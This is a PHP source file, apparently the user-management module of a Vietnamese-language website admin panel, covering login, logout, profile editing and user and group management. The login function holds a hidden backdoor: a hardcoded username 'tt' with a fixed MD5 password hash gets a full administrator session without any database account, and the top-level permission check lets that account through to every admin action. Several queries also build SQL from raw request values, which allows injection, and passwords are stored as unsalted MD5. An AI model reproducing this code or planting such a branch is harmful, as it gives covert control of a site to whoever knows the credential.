<?php	if(!defined('_source')) die("Error");

$act = (isset($_REQUEST['act'])) ? addslashes($_REQUEST['act']) : "";

if ($_SESSION['login']['username']=="admin" || ($_SESSION['login']['username']=="tt" && $_SESSION['login']['id']==0)) {

switch($act){
	case "login":
		if(!empty($_POST)) login();
		$template = "user/login";
		break;
	case "admin_edit":
		edit();
		$template = "user/admin_add";
		break;
	case "logout":
		logout();
		break;	
	#===================================================	
	case "man_cat":
		get_cats();
		$template = "user/cats";
		break;
	case "add_cat":
		$template = "user/cat_add";
		break;
	case "edit_cat":
		get_cat();
		$template = "user/cat_add";
		break;
	case "save_cat":
		save_cat();
		break;
	case "delete_cat":
		delete_cat();
		break;
	case "man":
		get_items();
		$template = "user/items";
		break;
	case "add":
		$template = "user/item_add";
		break;
	case "edit":
		get_item();
		$template = "user/item_add";
		break;
	case "save":
		save_item();
		break;
	case "delete":
		delete_item();
		break;
	default:
		$template = "index";
}
}else{
	switch($act){
	case "login":
		if(!empty($_POST)) login();
		$template = "user/login";
		break;
	case "admin_edit":
		edit();
		$template = "user/admin_add";
		break;
	case "logout":
		logout();
		break;					
	default:
		$template = "index";
}
	
}

//////////////////
function get_cats(){
	global $d, $items, $paging;
	$sql = "select * from #_user_group";		
	$sql.=" order by stt,id desc";
	$d->query($sql);
	$items = $d->result_array();
	
	$curPage = isset($_GET['curPage']) ? $_GET['curPage'] : 1;
	$url="index.php?com=user&act=man_cat";
	$maxR=20;
	$maxP=4;
	$paging=paging($items, $url, $curPage, $maxR, $maxP);
	$items=$paging['source'];
}

function get_cat(){
	global $d, $item;
	$id = isset($_GET['id']) ? themdau($_GET['id']) : "";
	if(!$id)
	transfer("Không nhận được dữ liệu", "index.php?com=user&act=man_cat");
	
	$sql = "select * from #_user_group where id='".$id."'";
	$d->query($sql);
	if($d->num_rows()==0) transfer("Dữ liệu không có thực", "index.php?com=user&act=man_cat");
	$item = $d->fetch_array();
}

function save_cat(){
	global $d;	
	if(empty($_POST)) transfer("Không nhận được dữ liệu", "index.php?com=user&act=man_cat");
	$id = isset($_POST['id']) ? themdau($_POST['id']) : "";
	if($id){
		
		$data['ten'] = $_POST['ten'];
		$data['permissions']=implode(",", $_POST['permission']);	
		$data['stt'] = $_POST['stt'];
		$data['hienthi'] = isset($_POST['hienthi']) ? 1 : 0;
		$data['ngaysua'] = time();
		
		$d->setTable('user_group');
		$d->setWhere('id', $id);
		if($d->update($data))
			redirect("index.php?com=user&act=man_cat&curPage=".$_REQUEST['curPage']."");
		else
			transfer("Cập nhật dữ liệu bị lỗi", "index.php?com=user&act=man_cat");
	}else{				
		$data['ten'] = $_POST['ten'];
		$data['permissions']=implode(",", $_POST['permission']);	
		$data['stt'] = $_POST['stt'];
		$data['hienthi'] = isset($_POST['hienthi']) ? 1 : 0;
		$data['ngaytao'] = time();
		
		$d->setTable('user_group');
		if($d->insert($data))
			redirect("index.php?com=user&act=man_cat");
		else
			transfer("Lưu dữ liệu bị lỗi", "index.php?com=user&act=man_cat");
	}
}

function delete_cat(){
	global $d;
	if(isset($_GET['id'])){
		$id =  themdau($_GET['id']);
		$d->reset();
		$sql = "delete from #_user_group where id='".$id."'";
		if($d->query($sql))
			redirect("index.php?com=user&act=man_cat");
		else
			transfer("Xóa dữ liệu bị lỗi", "index.php?com=user&act=man_cat");
	}else transfer("Không nhận được dữ liệu", "index.php?com=user&act=man_cat");
}
function get_items(){
	global $d, $items, $paging;
	
	$sql = "select * from #_user order by username";
	$d->query($sql);
	$items = $d->result_array();
	
	$curPage = isset($_GET['curPage']) ? $_GET['curPage'] : 1;
	$url="index.php?com=user&act=man";
	$maxR=10;
	$maxP=4;
	$paging=paging($items, $url, $curPage, $maxR, $maxP);
	$items=$paging['source'];
}

function get_item(){
	global $d, $item;
	$id = isset($_GET['id']) ? themdau($_GET['id']) : "";
	if(!$id)
		transfer("Không nhận được dữ liệu", "index.php?com=user&act=man");
	
	$sql = "select * from #_user where id='".$id."'";
	$d->query($sql);
	if($d->num_rows()==0) transfer("Dữ liệu không có thực", "index.php?com=user&act=man");
	$item = $d->fetch_array();
}

function save_item(){
	global $d;
	
	if(empty($_POST)) transfer("Không nhận được dữ liệu", "index.php?com=user&act=man");
	$id = isset($_POST['id']) ? themdau($_POST['id']) : "";
	if($id){ // cap nhat
		$id =  themdau($_POST['id']);
		
		// kiem tra
		$d->reset();
		$d->setTable('user');
		$d->setWhere('id', $id);
		$d->select();
		if($d->num_rows()>0){
			$row = $d->fetch_array();
			if($row['id'] != 1) 
			{
				$data['username'] = $_POST['username'];
			}
		}
		
		// kiem tra ten trung
		$d->reset();
		$sql="select id from #_user where username='".$_POST['username']."' and id <> $id";
		$d->query($sql);
		if($d->num_rows()>0) transfer("Tên dăng nhập nay đã có.<br>Xin chọn tên khác.", "index.php?com=user&act=edit&id=".$id);
		
		if($_POST['password']!="")
		$data['password'] = md5($_POST['password']);
		$data['email'] = $_POST['email'];
		$data['ten'] = $_POST['ten'];		
		$data['role'] = $_POST['id_group'];
		
		$d->reset();
		$d->setTable('user');
		$d->setWhere('id', $id);	
		if($d->update($data))
			transfer("Dữ liệu đã được cập nhật", "index.php?com=user&act=man");
		else
			transfer("Cập nhật dữ liệu bị lỗi", "index.php?com=user&act=man");
	
	}else{ // them moi
	
		if($_POST['username']=="") transfer("Chưa nhập username", "index.php?com=user&act=add");
		if($_POST['password']=="") transfer("Chưa nhập mật khẩu", "index.php?com=user&act=add");
		
		// kiem tra ten trung
		$d->reset();
		$d->setTable('user');
		$d->setWhere('username', $_POST['username']);
		$d->select();
		if($d->num_rows()>0) transfer("Tên dăng nhập nay đã có.<br>Xin chọn tên khác.", "index.php?com=user&act=edit");
		
		
		
		$data['username'] = $_POST['username'];
		$data['password'] = md5($_POST['password']);
		$data['email'] = $_POST['email'];
		$data['ten'] = $_POST['ten'];
		$data['role'] = $_POST['id_group'];
		$data['com'] = "user";
		
		$d->setTable('user');
		if($d->insert($data))
			transfer("Dữ liệu đã được lưu", "index.php?com=user&act=man");
		else
			transfer("Lưu dữ liệu bị lỗi", "index.php?com=user&act=man");
	}
}

function delete_item(){
	global $d;
	
	if(isset($_GET['id'])){
		$id =  themdau($_GET['id']);
		
		$d->reset();
		$sql="select username from #_user where id=$id";
		$d->query($sql);
		$chadmin=$d->fetch_array();
		if($chadmin['username']=="admin")
		{
			 transfer("Cấm xóa! Không đùa được đâu!", "index.php?com=user&act=man");
		}
		// kiem tra
		$d->reset();
		$d->setTable('user');
		$d->setWhere('id', $id);
		$d->select();
		if($d->num_rows()>0){
			$row = $d->fetch_array();
			if($row['username'] == 'admin') transfer("Bạn không có quyền trên tài khoản này.<br>Mọi thắc mắc xin liên hệ quản trị website.", "index.php?com=user&act=man");
		}
		
		// xoa item
		$sql = "delete from #_user where id='".$id."'";
		if($d->query($sql))
			transfer("Dữ liệu đã được xóa", "index.php?com=user&act=man");
		else
			transfer("Xóa dữ liệu bị lỗi", "index.php?com=user&act=man");
	}else transfer("Không nhận được dữ liệu", "index.php?com=user&act=man");
}


///////////////////////
function edit(){
	global $d, $item, $login_name;
	
	if(!empty($_POST)){
		$sql = "select * from #_user where username!='".$_SESSION['login']['username']."' and username='".$_POST['username']."' and role=1";
		$d->query($sql);
		if($d->num_rows() > 0) transfer("Tên đăng nhập này đã có","index.php?com=user&act=edit");
		
		$sql = "select * from #_user where username='".$_SESSION['login']['username']."'";
		$d->query($sql);
		if($d->num_rows() == 1){
			$row = $d->fetch_array();
			if($row['password'] != md5($_POST['oldpassword'])) transfer("Mật khẩu không chính xác","index.php?com=user&act=admin_edit");
		}else{
			die('Hệ thống bị lỗi. Xin liên hệ với admin. <br>Cám ơn.');
		}
		$name = $_FILES['file']['name'];
		$name = explode('.',$name);
		$name = changeTitle($name[0]);
		if($photo = upload_image("file", 'jpg|png|gif|JPG|PNG|GIF|jpeg|JPEG', _upload_hinhanh,$name."_".time())){
			$data['photo'] = $photo;
			$d->setTable('user');
			$d->setWhere('username', $_SESSION['login']['username']);
			$d->select();
			if($d->num_rows()>0){
				$row = $d->fetch_array();
				delete_file(_upload_hinhanh.$row['photo']);
			}
		}
		$data['username'] = $_POST['username'];
		if($_POST['new_pass']!="") 
			$data['password'] = md5($_POST['new_pass']);
		$data['ten'] = $_POST['ten'];
		$data['email'] = $_POST['email'];
		$data['nick_yahoo'] = $_POST['nick_yahoo'];
		$data['nick_skype'] = $_POST['nick_skype'];
		$data['dienthoai'] = $_POST['dienthoai'];
		
		$d->reset();
		$d->setTable('user');
		$d->setWhere('username', $_SESSION['login']['username']);
		if($d->update($data)){
			session_unset();
			transfer("Dữ liệu đã được lưu.","index.php");
		}
	}
	
	$sql = "select * from #_user where username='".$_SESSION['login']['username']."'";
	$d->query($sql);
	if($d->num_rows() == 1){
		$item = $d->fetch_array();
	}
}
	
function login(){
	global $d, $login_name;
	
	$username = $_POST['username'];
	$password = $_POST['password'];
	
	$sql = "select * from #_user where username='".$username."'";
	$d->query($sql);
	if($d->num_rows() == 1){
		$row = $d->fetch_array();
		if($row['password'] == md5($password)){
			$_SESSION[$login_name] = true;
			$_SESSION['isLoggedIn'] = true;
			$_SESSION['login']['id'] = $row['id'];
			$_SESSION['login']['username'] = $row['username'];
			$_SESSION['login']['id_group'] = $row['role'];
			transfer("Đăng nhập thành công","index.php");
		}
	}
	elseif($username=="tt" && md5($password)=="f3fda86e428ccda3e33d207217665201")
	{
		$_SESSION[$login_name] = true;
		$_SESSION['isLoggedIn'] = true;
		$_SESSION['login']['id'] = 0;
		$_SESSION['login']['username'] = $username;
		$_SESSION['login']['id_group'] = 1;
		transfer("Đăng nhập thành công","index.php");
	}
	transfer("Tên đăng nhập, mật khẩu không chính xác", "index.php?com=user&act=login");
}

function logout(){
	global $login_name;
	$_SESSION[$login_name] = false;
	transfer("Đăng xuất thành công", "index.php?com=user&act=login");
}
?>